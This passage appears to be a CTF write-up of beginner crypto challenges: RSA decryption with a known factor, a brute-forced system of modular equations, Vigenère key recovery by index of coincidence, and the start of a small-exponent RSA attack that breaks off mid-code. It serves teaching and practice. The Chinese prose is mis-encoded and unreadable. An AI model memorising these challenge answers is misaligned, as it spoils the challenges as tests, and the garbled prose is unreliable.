<h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><h4 id="è€ƒç‚¹ï¼šRSAåŠ å¯†"><a href="#è€ƒç‚¹ï¼šRSAåŠ å¯†" class="headerlink" title="è€ƒç‚¹ï¼šRSAåŠ å¯†"></a>è€ƒç‚¹ï¼šRSAåŠ å¯†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p,flag</span><br><span class="line">flag = bytes_to_long(<span class="built_in">bytes</span>(flag, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = q*p</span><br><span class="line">phi_ = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,phi_)</span><br><span class="line">c = (<span class="built_in">pow</span>(flag, e, n))</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">print((c,q,n))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;out put</span></span><br><span class="line"><span class="string">(177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194, 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043, 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç®€å•çš„è¿›è¡Œäº†RSAçš„åŠ å¯†æ¼”ç¤º</p>
<p>åœ¨æ³¨é‡Šä¸€æ ç»™äº†æˆ‘ä»¬Cï¼Œqï¼Œnï¼Œåœ¨ä¸Šé¢è¿˜ç»™äº†æˆ‘ä»¬Eï¼Œå¯ä»¥è¯´è¯¥ç»™çš„éƒ½ç»™äº†ï¼Œé‚£å°±å¾ˆç®€å•äº†</p>
<p>æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬è¿›è¡Œè§£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">q = <span class="built_in">int</span>(</span><br><span class="line">  <span class="string">&quot;166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043&quot;</span>,</span><br><span class="line">    <span class="number">10</span>)</span><br><span class="line">p = <span class="built_in">int</span>(<span class="string">&quot;1145143&quot;</span>,<span class="number">10</span>)</span><br><span class="line">e = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;0x10001&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line">c = <span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span></span><br><span class="line"></span><br><span class="line">n = q * p</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m çš„åè¿›åˆ¶å½¢å¼</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># mæ˜æ–‡</span></span><br><span class="line">print(string)  <span class="comment"># ç»“æœä¸º bâ€˜ m â€™ çš„å½¢å¼</span></span><br></pre></td></tr></table></figure>



<h3 id="Simple-calculation"><a href="#Simple-calculation" class="headerlink" title="Simple calculation"></a>Simple calculation</h3><h4 id="è€ƒç‚¹ï¼šçº¿æ€§åŒä½™æ–¹ç¨‹ç»„"><a href="#è€ƒç‚¹ï¼šçº¿æ€§åŒä½™æ–¹ç¨‹ç»„" class="headerlink" title="è€ƒç‚¹ï¼šçº¿æ€§åŒä½™æ–¹ç¨‹ç»„"></a>è€ƒç‚¹ï¼šçº¿æ€§åŒä½™æ–¹ç¨‹ç»„</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>çº¿æ€§åŒä½™æ–¹ç¨‹ç»„çš„è§£å¯ä»¥ç”±ä¸­å›½ä½™æ•°å®šç†æä¾›</p>
</blockquote>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-calculation.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-calculation"></p>
<p>ç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯</p>
<blockquote>
<p>S0 x S1 x S2 x S3 x S4  = 26 x k1 + 3</p>
<p>S0 x S1 x S2 x 3*S3 x 5*S4  = 26 x k2 + 7</p>
<p>S0 x 2*S1 x 2*S2 x 3*S3 x 3*S4  = 26 x k3 + 1</p>
<p>S0 x 2*S1 x 5*S2 x 3*S3 x S4  = 26 x k4 + 1</p>
<p>S0 x 2*S1 x S2 x 2*S3 x S4  = 26 x k5 + 20</p>
</blockquote>
<p>æˆ‘è§‰å¾—çš„æ˜¯æœ‰ä¸€ç‚¹åƒ<strong>ç™¾é’±ä¹°ç™¾é¸¡é—®é¢˜</strong>çš„ï¼Œéšä¾¿æäº†ä¸€ä¸ªç®€å•çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+j+k+l+m)%<span class="number">26</span> == <span class="number">3</span> <span class="keyword">and</span>(i+j+k+<span class="number">3</span>*l+<span class="number">5</span>*m)%<span class="number">26</span> == <span class="number">7</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+<span class="number">2</span>*k+<span class="number">3</span>*l+<span class="number">3</span>*m)%<span class="number">26</span> == <span class="number">1</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+<span class="number">5</span>*k+<span class="number">3</span>*l+m)%<span class="number">26</span> == <span class="number">1</span> <span class="keyword">and</span>(i+<span class="number">2</span>*j+k+<span class="number">2</span>*l+m)%<span class="number">26</span> == <span class="number">20</span>:</span><br><span class="line"></span><br><span class="line">                        print(<span class="string">&quot;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a[i],a[j],a[k],a[l],a[m]))</span><br></pre></td></tr></table></figure>



<h3 id="éŸ¡é«»çŒŠå²ˆ"><a href="#éŸ¡é«»çŒŠå²ˆ" class="headerlink" title="éŸ¡é«»çŒŠå²ˆ"></a>éŸ¡é«»çŒŠå²ˆ</h3><h4 id="è€ƒç‚¹ï¼šç»´å‰å°¼äºšå¯†ç "><a href="#è€ƒç‚¹ï¼šç»´å‰å°¼äºšå¯†ç " class="headerlink" title="è€ƒç‚¹ï¼šç»´å‰å°¼äºšå¯†ç "></a>è€ƒç‚¹ï¼šç»´å‰å°¼äºšå¯†ç </h4><p>æç¤ºï¼š</p>
<blockquote>
<p>Why not start with the short one,or make full use of Ur powerful pc and the Internet</p>
</blockquote>
<p>å¯†æ–‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oowfza errqbbirtqpl ks afiiklr cifgd ho unvhxnigkctm bugokz iaf chnxhvek tkvgnvf xeccmjkr; errqbbirtqpve aehwektana nte wfavinxe iequge kbopnuigkogbt ucrwomfu altczrtbpvf, oadjvt uuvi iyiokjbuos abzq vo usmnm ig TGP vhxsm vu nh umnts bo dviegfzr</span><br></pre></td></tr></table></figure>

<p>è®°å¾—æœ€æ—©æœ‰åšè¿‡ä¸€é“é¢˜ï¼Œé¢˜ç›®çš„åå­—ä¹Ÿæ˜¯åƒè¿™ä¸ªä¸€æ ·çš„ï¼Œæ˜¯<strong>ä¸­æ–‡ç”Ÿåƒ»å­—</strong>ï¼Œä½†è¯»éŸ³æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„ä¿¡æ¯æˆ‘ä»¬å°±æ‹¿è°·æ­Œç¿»è¯‘è¯»ä¸€ä¸‹ï¼Œåœ¨è‹±æ–‡æ¨¡å¼ä¸‹è¿›è¡Œæœ—è¯»ï¼Œå‡ºç°äº†<strong>ç»´å‰å°¼äºš</strong>ï¼Œokå¯ä»¥åŸºæœ¬é”å®šæ˜¯ç»´å‰å°¼äºšå¯†ç äº†</p>
<p>ç»´å‰å°¼äºšå¯†ç æœ€é‡è¦çš„æ˜¯æ‰¾åˆ°å¯†é’¥ï¼Œå¯†æ–‡ä¸­çš„å”¯ä¸€ä¸‰ä¸ªè¿åœ¨ä¸€èµ·çš„å¤§å†™å¸å¼•äº†æ³¨æ„åŠ›ï¼Œåæ¨å›å¯†é’¥ä¸­åº”è¯¥æœ‰<strong>bin</strong>ä¸‰ä¸ªå­—ç¬¦ï¼Œä½†åˆ°è¿™é‡Œå°±æ²¡æ³•ç»§ç»­äº†</p>
<p>åœ¨æŸ¥é˜…èµ„æ–™åå‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬åˆ†æå¯†æ–‡ï¼Œæ¥æ¨æµ‹å‡ºå¯†é’¥çš„é•¿åº¦ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†è‹±æ–‡æ¯ä¸ªå­—æ¯çš„è¯é¢‘ï¼Œåœ¨æ¨æµ‹å¯†é’¥æ˜¯ä»€ä¹ˆ</p>
<p>æœ€åè´´å‡ºå¤§ç¥çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 â€“*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c_alpha</span>(<span class="params">cipher</span>):</span>   <span class="comment"># å»æ‰éå­—æ¯åçš„å¯†æ–‡</span></span><br><span class="line">    cipher_alpha = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        <span class="keyword">if</span> (cipher[i].isalpha()):</span><br><span class="line">            cipher_alpha += cipher[i]</span><br><span class="line">    <span class="keyword">return</span> cipher_alpha</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—cipherçš„é‡åˆæŒ‡æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_CI</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    N = [<span class="number">0.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    cipher = c_alpha(cipher)</span><br><span class="line">    L = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):     <span class="comment">#è®¡ç®—æ‰€æœ‰å­—æ¯çš„é¢‘æ•°ï¼Œå­˜åœ¨æ•°ç»„Nå½“ä¸­</span></span><br><span class="line">            <span class="keyword">if</span> (cipher[i].islower()):</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">    CI_1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        CI_1 += ((N[i] / L) * ((N[i]-<span class="number">1</span>) / (L-<span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> CI_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ç§˜é’¥é•¿åº¦ä¸º key_len çš„é‡åˆæŒ‡æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_key_len_CI</span>(<span class="params">cipher,key_len</span>):</span></span><br><span class="line">    un_cip = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]    <span class="comment"># un_cip æ˜¯åˆ†ç»„</span></span><br><span class="line">    aver_CI = <span class="number">0.0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_alpha)):</span><br><span class="line">        z = i % key_len</span><br><span class="line">        un_cip[z] += cipher_alpha[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        un_cip[i]= count_CI(un_cip[i])</span><br><span class="line">        aver_CI += un_cip[i]</span><br><span class="line">    aver_CI = aver_CI/<span class="built_in">len</span>(un_cip)</span><br><span class="line">    <span class="keyword">return</span> aver_CI</span><br><span class="line"></span><br><span class="line"><span class="comment">## æ‰¾å‡ºæœ€å¯èƒ½çš„å‰åä¸ªç§˜é’¥é•¿åº¦</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_10</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    M = [(<span class="number">1</span>,count_CI(cipher))]+[(<span class="number">0</span>,<span class="number">0.0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">50</span>):</span><br><span class="line">        M[i] = (i,<span class="built_in">abs</span>(<span class="number">0.065</span> - count_key_len_CI(cipher,i)))</span><br><span class="line">    M = <span class="built_in">sorted</span>(M,key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])   <span class="comment">#æŒ‰ç…§æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ æ’åº</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span> (M[i])</span><br><span class="line"></span><br><span class="line">F = [</span><br><span class="line"><span class="number">0.0651738</span>, <span class="number">0.0124248</span>, <span class="number">0.0217339</span>,</span><br><span class="line"><span class="number">0.0349835</span>, <span class="number">0.1041442</span>, <span class="number">0.0197881</span>,</span><br><span class="line"><span class="number">0.0158610</span>, <span class="number">0.0492888</span>, <span class="number">0.0558094</span>,</span><br><span class="line"><span class="number">0.0009033</span>, <span class="number">0.0050529</span>, <span class="number">0.0331490</span>,</span><br><span class="line"><span class="number">0.0202124</span>, <span class="number">0.0564513</span>, <span class="number">0.0596302</span>,</span><br><span class="line"><span class="number">0.0137645</span>, <span class="number">0.0008606</span>, <span class="number">0.0497563</span>,</span><br><span class="line"><span class="number">0.0515760</span>, <span class="number">0.0729357</span>, <span class="number">0.0225134</span>,</span><br><span class="line"><span class="number">0.0082903</span>, <span class="number">0.0171272</span>, <span class="number">0.0013692</span>,</span><br><span class="line"><span class="number">0.0145984</span>, <span class="number">0.0007836</span></span><br><span class="line">]       <span class="comment"># è‹±æ–‡å­—ç¬¦é¢‘ç‡ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥ç»´å‰å°¼äºšå¯†æ–‡ï¼š&#x27;</span>)</span><br><span class="line">cipher_alpha = c_alpha(cipher)</span><br><span class="line">print(<span class="string">u&quot;çŒœæµ‹çš„ç§˜é’¥é•¿åº¦ä¸º:&quot;</span>)</span><br><span class="line">pre_10(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># çŒœæµ‹å•ä¸ªç§˜é’¥å¾—åˆ°çš„é‡åˆæŒ‡æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_CI2</span>(<span class="params">cipher,n</span>):</span>     <span class="comment"># n ä»£è¡¨æˆ‘ä»¬çŒœæµ‹çš„ç§˜é’¥ï¼Œä¹Ÿå³åç§»é‡</span></span><br><span class="line">    N = [<span class="number">0.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    cipher = c_alpha(cipher)</span><br><span class="line">    L = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):     <span class="comment">#è®¡ç®—æ‰€æœ‰å­—æ¯çš„é¢‘æ•°ï¼Œå­˜åœ¨æ•°ç»„Nå½“ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (cipher[i].islower()):</span><br><span class="line">            N[(<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - n)%<span class="number">26</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            N[(<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - n)%<span class="number">26</span>] += <span class="number">1</span></span><br><span class="line">    CI_2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        CI_2 += ((N[i] / L) * F[i])</span><br><span class="line">    <span class="keyword">return</span> CI_2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_key</span>(<span class="params">cipher,key_len</span>):</span></span><br><span class="line">    un_cip = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]</span><br><span class="line">    cipher_alpha = c_alpha(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_alpha)):     <span class="comment"># å®Œæˆåˆ†ç»„å·¥ä½œ</span></span><br><span class="line">        z = i % key_len</span><br><span class="line">        un_cip[z] += cipher_alpha[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        pre_5_key(un_cip[i])     <span class="comment">####è¿™é‡Œåº”è¯¥å°†5ä¸ªåˆ†ç»„çš„ç§˜é’¥çŒœæµ‹å…¨éƒ¨æ‰“å°å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## æ‰¾å‡ºå‰5ä¸ªæœ€å¯èƒ½çš„å•ä¸ªç§˜é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_5_key</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    M = [(<span class="number">0</span>,<span class="number">0.0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        M[i] = (<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i),<span class="built_in">abs</span>(<span class="number">0.065</span> - count_CI2(cipher,i)))</span><br><span class="line">    M = <span class="built_in">sorted</span>(M,key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])   <span class="comment">#æŒ‰ç…§æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ æ’åº</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span> (M[i])</span><br><span class="line"></span><br><span class="line">key_len = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥çŒœæµ‹çš„å¯†é’¥é•¿åº¦ï¼š&#x27;</span>))   <span class="comment">#è¾“å…¥çŒœæµ‹çš„ç§˜é’¥é•¿åº¦</span></span><br><span class="line">one_key(cipher,key_len)</span><br></pre></td></tr></table></figure>

<p>æœ€åå¯ä»¥å¾—åˆ°<strong>å¯†é’¥é•¿åº¦ä¸º6ï¼Œå¯†é’¥ä¸ºcatbin</strong></p>
<h3 id="childRSA"><a href="#childRSA" class="headerlink" title="childRSA"></a>childRSA</h3><h4 id="è€ƒç‚¹ï¼šRSAå°æŒ‡æ•°eçˆ†ç ´"><a href="#è€ƒç‚¹ï¼šRSAå°æŒ‡æ•°eçˆ†ç ´" class="headerlink" title="è€ƒç‚¹ï¼šRSAå°æŒ‡æ•°eçˆ†ç ´"></a>è€ƒç‚¹ï¼šRSAå°æŒ‡æ•°eçˆ†ç ´</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>vå…ˆç”Ÿæœ‰ä¸€è¾¹å¬å¹¿æ’­ä¸€è¾¹ç å­—çš„åä¹ æƒ¯ã€‚ä¸ºäº†ä¿è¯codingå·¥ä½œçš„æ­£ç¡®æ€§ï¼Œvå…ˆç”Ÿä»Šå¤©æŠŠæ•°æ®å¤šç®—äº†å‡ é</p>
</blockquote>
<p>é¢˜ç›®ç»™äº†æˆ‘ä»¬ä¸€ä¸ªç®—æ³•ï¼Œå’Œä¸‰ç»„æ•°æ®ï¼Œå…¶ä¸­æˆ‘ä»¬çŸ¥é“äº†<strong>e=3ï¼Œä¸‰ç»„c&amp;n</strong></p>
<p>è¿™ä¸ªeæ˜¯å°çš„ï¼Œç›´æ¥ååº”åˆ°å°æŒ‡æ•°çˆ†ç ´</p>
<blockquote>
<p>å½“e=3æ—¶ï¼Œå¦‚æœæ˜æ–‡è¿‡å°ï¼Œå¯¼è‡´æ˜æ–‡çš„ä¸‰æ¬¡æ–¹ä»ç„¶å°äºnï¼Œé‚£ä¹ˆé€šè¿‡ç›´æ¥å¯¹å¯†æ–‡ä¸‰æ¬¡å¼€æ–¹ï¼Œå³å¯å¾—åˆ°æ˜æ–‡</p>
<p>åŸç†ï¼šåŠ å¯†ä¸ºc=m^e mod n    è§£å¯†ä¸ºm=c^d mod n</p>
<p>åˆ†æï¼šå¦‚æœeè¿‡å°ï¼ˆm^e&lt;næˆ–è€…m^e&lt;2<em>nï¼‰ å°±å¯ä»¥ç›´æ¥å¯¹cå¼€æ–¹ã€‚ m^e=k</em>n+c</p>
</blockquote>
<p>æ‰€ä»¥ç›´æ¥è„šæœ¬çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M_ = bytes_to_long(<span class="built_in">bytes</span>(flag, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    rsa = 